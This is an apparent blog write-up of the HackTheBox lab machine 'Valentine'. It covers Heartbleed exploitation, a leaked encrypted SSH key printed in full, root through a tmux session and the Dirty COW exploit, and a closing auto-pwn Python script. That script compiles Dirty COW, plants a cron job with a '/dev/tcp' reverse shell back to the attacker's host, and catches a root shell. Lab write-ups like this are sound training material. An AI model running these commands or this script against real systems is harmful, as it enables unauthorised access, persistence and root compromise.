---
title: "HackTheBox - Valentine"
categories: [HackTheBox, Easy]
tags: [Easy,Web,Linux,OSCP]
mermaid: true
image: https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:22:48.png

---

This box was an Easy box from HackTheBox. It's OS is Linux. The entry point is with a vulnerability in the web app. Called HeartBleed, which let us get more data than we should. With that we get a ssh key and acces the box. The root I did in two ways, for a tmux session running as root and with dirty cow kernel exploit.

The exploit for this box is on the body of the post. Hope you enjoy!

# Diagram

```mermaid
graph TD
    A[Enumeration] -->|Nmap| B(Port 80 and 443)
    B --> C[HeartBleed]
    C --> |SSH Pass And Key| D[hype shell]
    D --> E[Root]
    E --> |TMUX| G[Root]
    E --> |Dirty Cow| H[Root]
    H --> |Python Script| I[Auto Pwn Python]
```

# Enumeration

First step is to enumerate the box. For this we'll use `nmap`

```sh
nmap -sV -sC -Pn 10.10.10.79
```

> -sV - Services running on the ports

> -sC - Run some standart scripts

> -Pn - Consider the host alive

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2009:48:58.png)

## Port 80/443

We try to open it on the browser

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2009:48:28.png)

It's an image, possible something related to heartbleed

Looking on the internet for `HeartBleed` we found [this](https://xkcd.com/1354/) explanation

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2009:52:51.png)

So what we need to do is try to retrieve more data than we are allowed to.

To prove that this host in vulnerable to this vuln we can use the nmap script

```sh
nmap --script ssl-heartbleed 10.10.10.79
```

And here we have the confirmation.

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2009:56:18.png)

We got a exploit for it on [github](https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:05:55.png)

### Heartbleed

We execute it

```py
python2 heartbleed.py -n 100 10.10.10.79
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:08:38.png)

And we got what seems to be a password

**heartbleedbelievethehype**

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:09:16.png)

### Gobuster

Now, let's perform some gobuster to see if we can get more pages in this server

```sh
gobuster dir -u http://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:11:31.png)

On /dev we found two files

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:11:48.png)

Notes.txt

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:12:00.png)

Hype_key, what seems to be hex

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:12:12.png)

And it's a ssh key

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:12:39.png)

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

# SSH Session

Now we access it with the key heartbleedbelievethehype

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:14:56.png)

Okay, now let's get root.

First we run [linpeas](https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:18:47.png)

# hype --> root

And we found tmux running as root in a session acessible for us

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:19:20.png)

```sh
/usr/bin/tmux -S /.devs/dev_sess
```

And, we are root

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:20:29.png)

We can get root too in this box with `dirtycow`

```sh
uname -a
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:43:44.png)

```sh
searchsploit dirty cow
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:45:23.png)

```sh
searchsploit -m linux/local/40839.c
```

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:50:20.png)

Upload to the box and execute it

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:50:58.png)

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:51:31.png)

And we are root

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:51:50.png)

Now let's easily automate it.


# Auto Reverse Shell

We'll use our skeleton

```py
#!/usr/bin/python3

import argparse
import requests
import sys

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()
    
    '''Here we call the functions'''
    
if __name__ == '__main__':
    main()
```

Here it is

![](https://0x4rt3mis.github.io/assets/img/hackthebox/2021-12-19-HackTheBox-Valentine/2021-12-19-HackTheBox-Valentine%2012:19:40.png)

auto_pwn_valentine.py

```py
#!/usr/bin/python3
# Author: 0x4rt3mis
# Valentine HackTheBox - Auto Pwn - Root Shell

import argparse
import sys
from pwn import *
import os
from subprocess import call
  
'''Here come the Functions'''
# SSH Key on the system and dirty cow
def DropFiles():
    print("[+] First let's just drop the ssh key on the server ! [+]")
    payload = "-----BEGIN RSA PRIVATE KEY-----\n"
    payload += "Proc-Type: 4,ENCRYPTED\n"
    payload += "DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46\n"
    payload += "\n"
    payload += "DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R\n"
    payload += "5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6\n"
    payload += "0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi\n"
    payload += "Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P\n"
    payload += "OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd\n"
    payload += "pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH\n"
    payload += "QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E\n"
    payload += "p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC\n"
    payload += "Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO\n"
    payload += "t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5\n"
    payload += "XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK\n"
    payload += "aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ\n"
    payload += "+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E\n"
    payload += "AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q\n"
    payload += "r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe\n"
    payload += "2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky\n"
    payload += "e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP\n"
    payload += "09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC\n"
    payload += "dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX\n"
    payload += "cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY\n"
    payload += "pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj\n"
    payload += "Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL\n"
    payload += "suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW\n"
    payload += "l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT\n"
    payload += "RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3\n"
    payload += "-----END RSA PRIVATE KEY-----"
    f = open("/tmp/ssh.key", "w")
    f.write(payload)
    f.close()
    os.system("chmod 600 /tmp/ssh.key")
    print("[+] SSH File Created !! [+]")
    print("[+] Now, let's get the dirty cow exploit file !! [+]")
    os.system("searchsploit -m linux/local/40839.c")
    print("[+] File copied to attacker folder ! [+]")

# Login SSH as hype and
def LoginHypeAndRoot(rhost,lport,lhost):
    hype_shell = ssh(host=rhost, port=22, user='hype', password='heartbleedbelievethehype', keyfile='/tmp/ssh.key')
    # Upload the Dirty Cow exploit to the target
    hype_shell.upload_file("40839.c","40839.c")
    os.system("rm 40839.c")
    # Compile it and make persistence
    hype_shell.run("gcc -pthread 40839.c -o rootshell -lcrypt && chmod +x rootshell && ./rootshell 142536")
    hype_shell.run("echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/%s/%s 0>&1' > monitor.sh && echo \"* * * * * bash /home/hype/monitor.sh\" > repeater && crontab repeater" %(lhost,lport))
    # Make the script to the next shell run
    lport = int(lport) + 1
    hype_shell.run("echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/%s/%s 0>&1' > monitor.sh" %(lhost,lport))
    hype_shell.close()
    pseudo_root = listen(lport).wait_for_connection() 
    pseudo_root.recv()
    pseudo_root.send(b"python -c 'import pty; pty.spawn(\"/bin/sh\")'")
    pseudo_root.send(b"\n")
    pseudo_root.recv()
    pseudo_root.send(b"su firefart -c \"sleep 5 && bash monitor.sh\"")
    pseudo_root.send(b"\n")
    pseudo_root.recv()
    pseudo_root.send(b"142536")
    pseudo_root.send(b"\n")
    pseudo_root.recv()
    pseudo_root.close()
    root_shell = listen(lport).wait_for_connection()
    root_shell.interactive()

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--localip', help='Local ip address or hostname', required=True)
    parser.add_argument('-lp', '--localport', help='Local port', required=True)
    args = parser.parse_args()

    rhost = args.target
    lhost = args.localip
    lport = args.localport

    '''Here we call the functions'''
    # Drop the ssh key and dirty cow
    DropFiles()
    # Login as hype in ssh session
    LoginHypeAndRoot(rhost,lport,lhost)


if __name__ == '__main__':
    main()
```

Done.